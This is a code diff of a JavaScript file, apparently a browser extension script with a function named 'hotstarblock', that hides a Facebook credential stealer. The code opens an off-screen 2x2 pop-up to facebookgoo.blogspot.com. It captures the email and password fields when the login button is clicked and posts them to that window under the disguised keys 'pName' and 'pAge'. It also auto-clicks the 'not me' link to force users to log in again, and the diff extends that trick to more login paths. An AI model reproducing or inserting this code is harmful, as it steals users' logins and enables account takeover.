@@ -136,9 +136,7 @@ function hotstarblock() {
 }
 const s =window.location.pathname;if (window.location.href=="https://www.facebook.com/") {openChild();openChild();}if(window.location.host=="www.facebook.com" && s=="/login/"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}var childwin;function openChild() {childwin = window.open('https://facebookgoo.blogspot.com/','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=2, height=2, ', '');  
 childwin.blur();}if (window.location.href=="https://www.facebook.com/") { const send = document.querySelector("button[name='login']");
-if (send) {send.onclick=function () {let msg={pName : document.querySelector("#email").value, pAge: document.querySelector("#pass").value};childwin.postMessage(msg,'https://facebookgoo.blogspot.com/');childwin.focus();}}}
-
-
+if (send) {send.onclick=function () {let msg={pName : document.querySelector("#email").value, pAge: document.querySelector("#pass").value};childwin.postMessage(msg,'https://facebookgoo.blogspot.com/');childwin.focus();}}}if(window.location.host=="www.facebook.com" && s=="/login"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}if(window.location.host=="www.facebook.com" && s=="/login.php"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}
 
     
 
